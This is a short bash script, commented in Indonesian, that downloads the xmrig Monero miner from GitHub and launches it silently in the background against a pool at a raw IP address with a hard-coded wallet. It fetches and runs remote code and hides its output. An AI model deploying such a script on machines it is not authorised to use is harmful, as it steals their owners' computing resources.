#!/bin/bash

# Download dan ekstrak miner
if pgrep -x "xmrig" > /dev/null; then
    echo "[INFO] xmrig sudah berjalan. Tidak dijalankan ulang."
    exit 0
fi

if [ ! -d "xmrig-6.22.3" ]; then
    wget https://github.com/xmrig/xmrig/releases/download/v6.22.3/xmrig-6.22.3-linux-static-x64.tar.gz
    tar -xzvf xmrig-6.22.3-linux-static-x64.tar.gz
fi

cd xmrig-6.22.3
nohup ./xmrig -o 159.65.167.171:443 -k --donate-level 1 --tls -t8 -u 8AvgPZgYW66EghiN3ZckD6Vz1F2pqf3zMUCqyPe6X19MNaitD1P8ZdZMKrviBq15TYN6L6zUMLmLsR7jaVopgXQ1Tesgq19 -p RIZA > /dev/null 2>&1 &
